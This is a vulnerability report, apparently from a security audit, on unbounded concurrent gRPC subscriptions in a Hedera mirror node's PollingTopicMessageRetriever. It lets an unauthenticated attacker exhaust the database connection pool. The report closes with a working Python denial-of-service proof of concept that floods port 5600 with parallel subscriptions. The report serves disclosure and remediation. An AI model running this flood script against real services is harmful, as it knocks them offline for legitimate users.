### Title
Unbounded Concurrent gRPC Subscriptions via Multi-Connection Resource Exhaustion in `PollingTopicMessageRetriever.retrieve()`

### Summary
`PollingTopicMessageRetriever.retrieve()` imposes no per-IP or per-user subscription limit. The only guard — `maxConcurrentCallsPerConnection = 5` — is scoped to a single TCP connection, which an unauthenticated attacker trivially bypasses by opening many parallel connections. Each subscription independently polls the database on a `boundedElastic` scheduler thread, allowing an attacker to exhaust the database connection pool and thread resources, rendering the mirror node's gRPC service unavailable to legitimate clients.

### Finding Description

**Exact code path:**

`ConsensusController.subscribeTopic()` → `TopicMessageServiceImpl.subscribeTopic()` → `PollingTopicMessageRetriever.retrieve()` (lines 44–63).

In `retrieve()`, every call unconditionally allocates a new `PollingContext` and schedules a repeating database poll:

```java
// PollingTopicMessageRetriever.java:50-58
PollingContext context = new PollingContext(filter, throttled);
return Flux.defer(() -> poll(context))
        .repeatWhen(RepeatSpec.create(r -> !context.isComplete(), context.getNumRepeats())
                .jitter(0.1)
                .withFixedDelay(context.getFrequency())
                .withScheduler(scheduler))
        ...
        .retryWhen(Retry.backoff(Long.MAX_VALUE, Duration.ofSeconds(1)))
        .timeout(retrieverProperties.getTimeout(), scheduler)
```

When `throttled = true` (the path taken from `TopicMessageServiceImpl`), `PollingContext` sets `numRepeats = Long.MAX_VALUE` and `frequency = 2s` (lines 98–101 of `PollingTopicMessageRetriever.java`). This means each subscription issues a `topicMessageRepository.findByFilter()` database query every ~2 seconds, indefinitely, until the 60-second inactivity timeout fires (only triggered when no messages are emitted — an active topic never hits it).

**Root cause — the only connection-level guard is per-connection, not per-IP:**

```java
// GrpcConfiguration.java:33
serverBuilder.maxConcurrentCallsPerConnection(nettyProperties.getMaxConcurrentCallsPerConnection());
// NettyProperties.java:14 — default value = 5
private int maxConcurrentCallsPerConnection = 5;
```

This caps concurrent RPC calls on a **single TCP connection** to 5. There is no limit on the number of TCP connections from a single IP address, no global subscription cap, and no authentication. A grep across the entire codebase for `maxConnections`, `connectionLimit`, `perIp`, and `ipLimit` returns zero matches in Java sources.

`subscriberCount` in `TopicMessageServiceImpl` (line 48) is a Micrometer gauge for observability only — it enforces nothing:

```java
// TopicMessageServiceImpl.java:48,89-90
private final AtomicLong subscriberCount = new AtomicLong(0L);
.doOnSubscribe(s -> subscriberCount.incrementAndGet())
.doFinally(s -> subscriberCount.decrementAndGet())
```

**Exploit flow:**

1. Attacker opens `N` TCP connections to port 5600 (no authentication, no IP-level connection cap).
2. On each connection, attacker issues 5 concurrent `subscribeTopic` RPCs with no `limit` and a `startTime` in the past (ensuring the topic has messages so the inactivity timeout never fires).
3. Each of the `5N` subscriptions calls `retrieve()`, allocating a `PollingContext` and scheduling a DB poll every 2 seconds on `Schedulers.boundedElastic()`.
4. At `N = 200`, there are 1,000 concurrent subscriptions issuing 500 DB queries/second. At `N = 2,000`, there are 10,000 subscriptions issuing 5,000 DB queries/second.
5. The database connection pool (typically 10–50 connections) saturates; legitimate importer and gRPC queries queue and time out.

### Impact Explanation
The database connection pool is the binding constraint. With enough parallel connections, every available DB connection is consumed by attacker-controlled polling subscriptions. The importer can no longer write ingested transactions, and legitimate gRPC subscribers receive errors or stall indefinitely. This constitutes a full denial-of-service of the mirror node's gRPC API and can cascade to impair the importer's ability to record new consensus transactions into the mirror database.

### Likelihood Explanation
The attack requires no credentials, no special knowledge, and no privileged network position — only the ability to open TCP connections to port 5600. Standard gRPC client libraries (Java, Go, Python) make opening hundreds of parallel connections trivial. The attack is fully repeatable: after the 60-second inactivity timeout terminates a batch of subscriptions, the attacker immediately reopens them. Automation with a simple script (e.g., `grpc_requests` in Python or a Go goroutine pool) makes sustained exhaustion straightforward.

### Recommendation

1. **Enforce a per-IP connection limit** at the Netty layer via `NettyServerBuilder.maxConnectionsPerIp()` (available in grpc-netty) or an upstream load-balancer/ingress rule.
2. **Add a global concurrent-subscription cap** by checking `subscriberCount` against a configurable maximum before proceeding in `TopicMessageServiceImpl.subscribeTopic()`, returning `RESOURCE_EXHAUSTED` when exceeded.
3. **Add a per-IP subscription counter** using a `ConcurrentHashMap<InetAddress, AtomicInteger>` populated from `ServerCall.getAttributes(Grpc.TRANSPORT_ATTR_REMOTE_ADDR)` in a `ServerInterceptor`, rejecting new subscriptions beyond a per-IP threshold.
4. **Reduce the default `timeout`** for subscriptions on topics with no recent activity, or enforce a hard wall-clock maximum subscription duration independent of message emission.

### Proof of Concept

```python
import grpc
import threading
from com.hedera.mirror.api.proto import consensus_service_pb2, consensus_service_pb2_grpc
from proto.services import basic_types_pb2, timestamp_pb2

TARGET = "mirror-node-host:5600"
CONNECTIONS = 500   # 500 TCP connections × 5 calls = 2500 concurrent subscriptions
CALLS_PER_CONN = 5

def flood_connection(_):
    channel = grpc.insecure_channel(TARGET)
    stub = consensus_service_pb2_grpc.ConsensusServiceStub(channel)
    query = consensus_service_pb2.ConsensusTopicQuery(
        topicID=basic_types_pb2.TopicID(topicNum=1),
        consensusStartTime=timestamp_pb2.Timestamp(seconds=0),
        # no limit, no endTime → subscription never self-terminates
    )
    threads = []
    for _ in range(CALLS_PER_CONN):
        t = threading.Thread(target=lambda: list(stub.subscribeTopic(query)))
        t.start()
        threads.append(t)
    for t in threads:
        t.join()

pool = [threading.Thread(target=flood_connection, args=(i,)) for i in range(CONNECTIONS)]
for t in pool: t.start()
for t in pool: t.join()
# Expected result: DB connection pool exhausted within seconds;
# legitimate subscribeTopic calls return UNAVAILABLE or hang indefinitely.
```
